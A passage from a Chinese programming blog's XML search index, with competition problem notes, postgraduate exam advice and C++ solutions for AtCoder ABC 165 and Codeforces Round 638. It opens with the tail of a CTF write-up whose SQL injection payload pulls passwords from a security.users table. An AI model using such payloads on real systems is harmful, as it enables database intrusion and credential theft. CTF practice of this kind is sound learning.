punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目记录</title>
      <link href="/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="记录贴"><a href="#记录贴" class="headerlink" title="记录贴"></a>记录贴</h2><div class="table-container"><table><thead><tr><th style="text-align:center">题号</th><th style="text-align:center">来源</th><th style="text-align:center">题意</th><th style="text-align:center">知识点</th><th style="text-align:center">题解</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">1514C</td><td style="text-align:center"><a href="https://codeforces.com/contest/1514/problem/C">Codeforces</a></td><td style="text-align:center">给定一个序列从$1 \sim n$，求出一个最长子序列，这个子序列的乘积 $\pmod n$为1。</td><td style="text-align:center">数论</td><td style="text-align:center">理解 $gcd(p \% n,n)=gcd(p,n)  \neq 1$ 即可</td><td style="text-align:center"><a href="https://codeforces.com/contest/1514/submission/115107931">链接</a></td></tr><tr><td style="text-align:center">1512G</td><td style="text-align:center"><a href="https://codeforces.com/problemset/problem/1512/G">Codeforces</a></td><td style="text-align:center">定义一个式子$d(n)=\sum\limits_{kn}{k}$输入一个范围为$1\leq c \leq {10}^7$的数字，输出$d(c)$的值。</td><td style="text-align:center">数论</td><td style="text-align:center">用筛法，将所有$\leq 10^7$的算出来，查表即可;算法复杂度$O(nlogn)$</td><td style="text-align:center"><a href="https://codeforces.com/contest/1512/submission/115398043">链接</a></td></tr><tr><td style="text-align:center">ABC224E</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc224/tasks/abc224_e">Atcoder</a></td><td style="text-align:center">给定一个$h*w$矩阵和n个在矩阵上的点的权值，每个点可以向比他大的点的权值移动，求每个点的最大移动次数</td><td style="text-align:center">动态规划</td><td style="text-align:center">$dp[i]$表示第i个点的最大移动次数，$dp[i]=max(rmax[r[i]],cmax[c[i]]$,$rmax[r[i]]=max(rmax[r[i]],dp[i]+1)，cmax[c[i]]=max(cmax[c[i]],dp[i]+1)$更新。</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc224/submissions/26782930">链接</a></td></tr><tr><td style="text-align:center">ABC230E</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc230/editorial/3031">Atcoder</a></td><td style="text-align:center">给定一个数$n$，求$\sum_{i=1}^{N}{[\frac{N}{i}}]$，其中$[\frac{N}{i}]$表示下取整</td><td style="text-align:center">数学</td><td style="text-align:center">考虑$k=\sqrt{n}$,则所有的$[\frac{N}{i}]$均可以用$1,2,3,…,k$来表示，于是$\sum<em>{i=1}^{N}{[\frac{N}{i}]}=\sum</em>{i=1}^{k}{([\frac{N}{i}]-[\frac{N}{i+1}])*i}+\sum_{i=1}^{\frac{n}{k+1}}{i}$</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc230/submissions/27686946">连接</a></td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>考研经验</title>
      <link href="/2021/03/24/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/03/24/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h2 id="2021年上岸东北大学秦皇岛分校电子信息专业经验"><a href="#2021年上岸东北大学秦皇岛分校电子信息专业经验" class="headerlink" title="2021年上岸东北大学秦皇岛分校电子信息专业经验"></a>2021年上岸东北大学秦皇岛分校电子信息专业经验</h2><h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a>一、 前言</h3><ol><li>我在2021年考研中初试总分374，政治75，英语二72，数学二108，专业课842（C+数据结构+操作系统）119。我数学和专业课考得并不是很好，低于我得预期目标了，还好运气好，最终还是上岸了（惊险）。</li><li>现在如果大家准备考研得话应该还是在择校阶段，我建议热门专业，热门学校，热门地区三个中间选两个，这样可能会比较容易上岸一点。如果到暑假结束认为自己数学和专业课复习得还行得话，可以三个全选。</li><li>我在南书院复习的，不得不说，南书院的小姐姐真的好看。但是即使好看也不要有过多的想法，有想法也要等考研之后再说，考研压力会挺大的，偶尔心理也可能会有问题，建议这个时候放下笔，休息半天。</li><li>选择 $&gt;$ 努力</li></ol><h3 id="二、-英语"><a href="#二、-英语" class="headerlink" title="二、 英语"></a>二、 英语</h3><ol><li>单词：<br>英语我是从4月份开始陆陆续续背单词得，我先用得墨墨背单词，每天300个，后面背完了考研大纲词汇之后使用扇贝背单词，每天70新词+210旧词，今年新加了大纲词汇，扇贝单词有专门得整理。</li><li>阅读：<br>我使用得是张剑得黄皮书，虽然是英语二，但是我英语一得阅读也做了。阅读我还看了几年的唐迟的阅读课，他的技巧很不错。英语一阅读我刷了一遍，英语二阅读我刷了两遍。6-8月的时候我把英语一的阅读做完了，之后时间到考前就一直在做英语二的阅读。</li><li>写作：<br>我看的刘晓燕写作课，后面只剩两个月的时候，我每个礼拜平均练习2篇大作文，一篇小作文。最后半个月因为要背政治，时间比较紧，就没有练习。</li><li>翻译、完型：<br>我没有特别的练习，在最后做真题的时候和阅读一起掐表做的。</li></ol><h3 id="三、政治"><a href="#三、政治" class="headerlink" title="三、政治"></a>三、政治</h3><ol><li>网课：<br>我是9月份开始的，听的徐涛强化班，但是我听下来感觉没什么用（个人意见），可以试试腿姐的，如果时间紧，可以只看马原部分；腿姐的技巧班很好用，强烈推荐；</li><li>习题<br>肖秀荣1000题+肖八+肖四（肖秀荣yyds），可以做做腿四+徐八的选择题部分</li></ol><h3 id="四、数学"><a href="#四、数学" class="headerlink" title="四、数学"></a>四、数学</h3><ol><li>这门课学习效率很关键。数学战线拉的越长越好，先基础（很重要），基础全做对应该有110+（李永乐老师原话）。</li><li>我是听的汤家凤基础班(7-8)月 + 武忠祥的强化班（8-9）月，做题做的是李王复习全书+线性代数辅导讲义+660+330 ，李林108+李四+李八，张八我做了两套感觉没什么参考价值就没做了，还有做了合工大超越5套。 </li><li>我的建议是武忠祥基础班（配合660一起做）+武忠祥强化班（配合330一起做），复习全书在这之后写完，然后写李林的108，到这里差不多应该有模拟卷出来了，如果还没出来，可以做往年的合工大超越卷。</li></ol><h3 id="五、专业课"><a href="#五、专业课" class="headerlink" title="五、专业课"></a>五、专业课</h3><ol><li>我是用的王道+历年真题。</li><li>如果报名的是高梯度院校，课本必须自己过一遍，可以配合网课，但是课本一定要认真过一遍。</li><li>专业课复习要早一点，我自认为我不会有问题，到9月份才开始看的，然后也没怎么在意，最后就翻车了，要引以为戒。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 165</title>
      <link href="/2020/05/03/AtCoder-ABC-165/"/>
      <url>/2020/05/03/AtCoder-ABC-165/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-165-C-F"><a href="#AtCoder-ABC-165-C-F" class="headerlink" title="AtCoder ABC 165 (C~F)"></a>AtCoder ABC 165 (C~F)</h1><ul><li>前言:<br>这次感觉 $C$ 题和 $D$ 题反了一下。</li></ul><h2 id="C-Many-Requirements"><a href="#C-Many-Requirements" class="headerlink" title="C. Many Requirements"></a>C. Many Requirements</h2><ul><li><p>题意:<br>给定 $N,M,Q$ 表示有一个长度为 $N$ 的数组 $A$，数组的每个元素的范围为 $1 \leq A[i] \leq M$, 然后给定 $Q$ 个四元组 $a_i,b_i,c_i,d_i$ ，如果满足 $A[b_i]-A[a_i]=c_i$,则该数组的价值 $+d_i$  , 问价值最高是多少，数组 $A$ 为不下降序列。</p></li><li><p>题解：<br>一开始以为 $dfs$ 的话会超时，后来算了一下，发现只要枚举 $\tbinom{N+M+1}{M-1}$ 即可，这样最大值就是 $\tbinom{19}{9}=92378$ , $dfs$ 并不会超时。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">nd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> q<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token operator">==</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>c<span class="token punctuation">)</span>            tmp <span class="token operator">+=</span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    sum <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pos<span class="token operator">==</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> a<span class="token punctuation">[</span>pos<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> q<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>a <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>b <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Floor-Function"><a href="#D-Floor-Function" class="headerlink" title="D. Floor Function"></a>D. Floor Function</h2><ul><li><p>题意:<br>给定 $A,B,N$，让你求出一个数 $x$ 使得 $floor(Ax/B)-A*floor(x/B)$的最大值</p></li><li><p>题解:<br>发现 $x=min(B-1,n)$ 的时候取最大值。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    db a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> a <span class="token operator">>></span> b <span class="token operator">>></span> n<span class="token punctuation">;</span>    db x <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">floor</span><span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">/</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Rotation-Matching"><a href="#E-Rotation-Matching" class="headerlink" title="E. Rotation Matching"></a>E. Rotation Matching</h2><ul><li><p>题意:<br>$N$ 个人，$M$ 个竞技场，每个竞技场会有编号，对应编号的人参与竞技，一次竞技之后所有参赛人数的编号 $+1 mod N$ ,问每个对手不不重复对战两次的排序方式。</p><ul><li>题解:<br>相差放数字即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> l <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> l <span class="token operator">+</span> x <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> l<span class="token operator">++</span><span class="token punctuation">,</span> x<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> r <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> r <span class="token operator">-</span> x <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> r<span class="token operator">--</span><span class="token punctuation">,</span> x<span class="token operator">--</span><span class="token punctuation">;</span>        f <span class="token operator">^=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="F-LIS-on-Tree"><a href="#F-LIS-on-Tree" class="headerlink" title="F. LIS on Tree"></a>F. LIS on Tree</h2><ul><li><p>题意:<br>给一个有 $N$ 个节点的树，每个节点有一个权值，问从 $1$ 开始访问到第 $k$ 个节点经过的路径权值序列的最长上升序列的长度是多少。</p></li><li><p>题解：<br>可以一边 $dfs$ 一边跑$LIS$，然后记录答案即可。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> rd<span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> now <span class="token operator">=</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>rd<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rd<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> rd<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lst<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">==</span>rd<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        pop <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> rd<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        lst <span class="token operator">=</span> rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">,</span> rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>    ans<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> rd<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token operator">!=</span>p<span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span>        rd<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> lst<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #638 (Div. 2)</title>
      <link href="/2020/05/02/Codeforces-Round-638-Div-2/"/>
      <url>/2020/05/02/Codeforces-Round-638-Div-2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="Codeforces-Round-638-Div-2"><a href="#Codeforces-Round-638-Div-2" class="headerlink" title="Codeforces Round #638 (Div. 2)"></a>Codeforces Round #638 (Div. 2)</h1><h2 id="A-Phoenix-and-Balance"><a href="#A-Phoenix-and-Balance" class="headerlink" title="A. Phoenix and Balance"></a>A. Phoenix and Balance</h2><ul><li>题意:<br>给定一个数 $n$ ，让你将$2^1 + 2^2 + …+2^n$ 等分成两组数，使得这两组数的绝对值之差最小，输出最小值。</li><li>题解:<br>会发现可以用二进制表示这 $n$ 个数，那么对于给定$n=6$,则可以表示为 $100011$ 和$011100$，这两个数的绝对值之差最小。按这个思路模拟即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll  n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ll i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">;</span> i <span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">==</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cnt<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">abs</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="B-Phoenix-and-Beauty"><a href="#B-Phoenix-and-Beauty" class="headerlink" title="B.Phoenix and Beauty"></a>B.Phoenix and Beauty</h2><ul><li><p>题意:<br>给定两个数 $n,k$ ,和一个包含$n$个数的序列 , 通过向原串中插入数字构造一个串 , 使得任意长度为k的子串之和相等.</p></li><li><p>题解:</p></li></ul><ol><li>发现如果原序列的数字种类如果大于 $k$ 的话,无法构成序列.</li><li>如果小于 $k$ 的话,则可以填充任意数字到 $k$ ,然后每个序列重复$n$次即可.</li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin<span class="token operator">>></span>a<span class="token punctuation">;</span>        st<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">vec</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> st<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>m<span class="token punctuation">)</span>            vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> n <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                cout <span class="token 